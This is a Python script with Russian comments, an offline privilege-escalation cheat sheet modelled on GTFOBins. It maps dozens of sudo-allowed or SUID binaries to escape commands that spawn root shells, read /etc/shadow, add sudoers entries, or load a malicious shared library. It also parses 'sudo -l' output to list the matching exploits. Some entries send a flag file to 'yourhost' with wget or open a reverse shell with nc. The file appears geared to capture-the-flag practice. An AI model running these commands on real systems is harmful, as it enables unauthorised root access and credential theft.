#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
gtfobins.py — оффлайн-шпаргалка по повышению привилегий через штатные бинари.

  python gtfobins.py --list
  python gtfobins.py --check find,base64,vim
  python gtfobins.py --from-sudo sudo.txt

--from-sudo читает вывод `sudo -l` и сам вытаскивает пути из строк NOPASSWD.
"""
from __future__ import annotations

# Windows: консоль/pipe не должны падать на Unicode (—, →, «», █).
try:
    import sys as _sys
    for _stream in (_sys.stdout, _sys.stderr):
        _stream.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import argparse
import os
import re

# (sudo-команда, suid-команда/заметка)
DB = {
    "find": ("sudo find . -exec /bin/sh \\; -quit", "find . -exec /bin/sh -p \\; -quit"),
    "vim": ("sudo vim -c ':!/bin/sh'", "vim -c ':!/bin/sh'"),
    "vi": ("sudo vi -c ':!/bin/sh'", "vi -c ':!/bin/sh'"),
    "less": ("sudo less /etc/passwd  # затем !/bin/sh", "less /etc/passwd  # !/bin/sh"),
    "more": ("sudo more /etc/passwd  # затем !/bin/sh", "more /etc/passwd"),
    "man": ("sudo man man  # затем !/bin/sh", "man man  # !/bin/sh"),
    "awk": ("sudo awk 'BEGIN {system(\"/bin/sh\")}'", "awk 'BEGIN {system(\"/bin/sh\")}'"),
    "sed": ("sudo sed -n '1e exec /bin/sh' /etc/passwd", "sed -n '1e exec /bin/sh' /etc/passwd"),
    "perl": ("sudo perl -e 'exec \"/bin/sh\"'", "perl -e 'exec \"/bin/sh\"'"),
    "ruby": ("sudo ruby -e 'exec \"/bin/sh\"'", "ruby -e 'exec \"/bin/sh\"'"),
    "python": ("sudo python3 -c 'import os; os.system(\"/bin/sh\")'", "python3 -c 'import os; os.system(\"/bin/sh\")'"),
    "python3": ("sudo python3 -c 'import os; os.system(\"/bin/sh\")'", "python3 -c 'import os; os.system(\"/bin/sh\")'"),
    "node": ("sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'", ""),
    "tar": ("sudo tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh", "tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh"),
    "zip": ("sudo zip x.zip x -T -TT 'sh #'", "zip x.zip x -T -TT 'sh #'"),
    "unzip": ("sudo unzip -K x.zip  # файл перезаписывается в /root", ""),
    "base64": ("sudo base64 /etc/shadow | base64 -d", "base64 /etc/shadow | base64 -d"),
    "xxd": ("sudo xxd /etc/shadow | xxd -r", ""),
    "dd": ("sudo dd if=/etc/shadow", ""),
    "cp": ("sudo cp /bin/sh /tmp/sh && sudo chmod +s /tmp/sh", ""),
    "mv": ("sudo mv /bin/sh /tmp/sh", ""),
    "cat": ("sudo cat /root/flag", ""),
    "head": ("sudo head -c 1000 /root/flag", ""),
    "tail": ("sudo tail -c 1000 /root/flag", ""),
    "sort": ("sudo sort /root/flag", ""),
    "tee": ("echo 'x' | sudo tee /etc/sudoers.d/x", ""),
    "env": ("sudo env /bin/sh", "env /bin/sh"),
    "git": ("sudo git -c core.pager='sh -c \"sh <&2 >&2\"' log", ""),
    "docker": ("sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"),
    "mysql": ("sudo mysql -e '\\! /bin/sh'", ""),
    "psql": ("sudo psql -c '\\! /bin/sh'", ""),
    "sqlite3": ("sudo sqlite3 /tmp/x '.shell /bin/sh'", ""),
    "systemctl": ("sudo systemctl edit x  # или link на свой unit", ""),
    "journalctl": ("sudo journalctl --no-pager  # затем !/bin/sh", ""),
    "apt": ("sudo apt -o APT::Update::Pre-Invoke::=/bin/sh update", ""),
    "pip": ("sudo pip install x  # FakePip: setup.py выполняется от root", ""),
    "npm": ("sudo npm --eval 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'", ""),
    "nmap": ("sudo nmap --interactive  # затем !sh (старые версии)", ""),
    "tcpdump": ("sudo tcpdump -i lo -G1 -w /dev/null -z /bin/sh", ""),
    "ssh": ("sudo ssh -o ProxyCommand='sh -c \"sh <&2 >&2\"' x", ""),
    "rsync": ("sudo rsync -e 'sh -c \"sh <&2 >&2\"' x x", ""),
    "make": ("sudo make -s --eval='$(shell /bin/sh)' x", ""),
    "gcc": ("sudo gcc -wrapper /bin/sh,-s . x", ""),
    "openssl": ("sudo openssl req -engine /tmp/evil.so", ""),
    "curl": ("sudo curl file:///root/flag", ""),
    "wget": ("sudo wget --post-file=/root/flag http://yourhost/", ""),
    "nc": ("sudo nc -e /bin/sh host port", ""),
    "socat": ("sudo socat exec:/bin/sh", ""),
    "busybox": ("sudo busybox sh", "busybox sh"),
    "bash": ("sudo bash", "bash -p"),
    "sh": ("sudo sh", "sh -p"),
    "ed": ("sudo ed  # затем !/bin/sh", ""),
    "screen": ("sudo screen -x  # или screen -S x", ""),
    "tmux": ("sudo tmux new -s x", ""),
}


def norm(path: str) -> str:
    return os.path.basename(path.strip().strip("'\""))


def cmd_list():
    for name in sorted(DB):
        sudo, suid = DB[name]
        print(f"{name:12s} sudo: {sudo}")
        if suid:
            print(f"{'':12s} suid: {suid}")


def cmd_check(names):
    found = False
    for raw in names:
        name = norm(raw)
        if name in DB:
            found = True
            sudo, suid = DB[name]
            print(f"\n=== {name} ===")
            print("  sudo:", sudo)
            if suid:
                print("  suid:", suid)
        elif name:
            print(f"[-] {name}: нет в базе (проверь вручную на gtfobins.github.io)")
    if not found:
        print("[-] совпадений нет")


def cmd_from_sudo(path):
    txt = open(path, encoding="utf-8", errors="replace").read()
    names = set()
    for line in txt.splitlines():
        if "NOPASSWD" in line or "may run" in line or ")" in line:
            for m in re.findall(r"(/[^\s,]+)", line):
                names.add(norm(m))
    print("[+] из sudo -l:", sorted(names))
    cmd_check(sorted(names))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--check")
    ap.add_argument("--from-sudo")
    args = ap.parse_args()
    if args.list:
        cmd_list()
    elif args.check:
        cmd_check(args.check.split(","))
    elif args.from_sudo:
        cmd_from_sudo(args.from_sudo)
    else:
        ap.print_help()


if __name__ == "__main__":
    main()
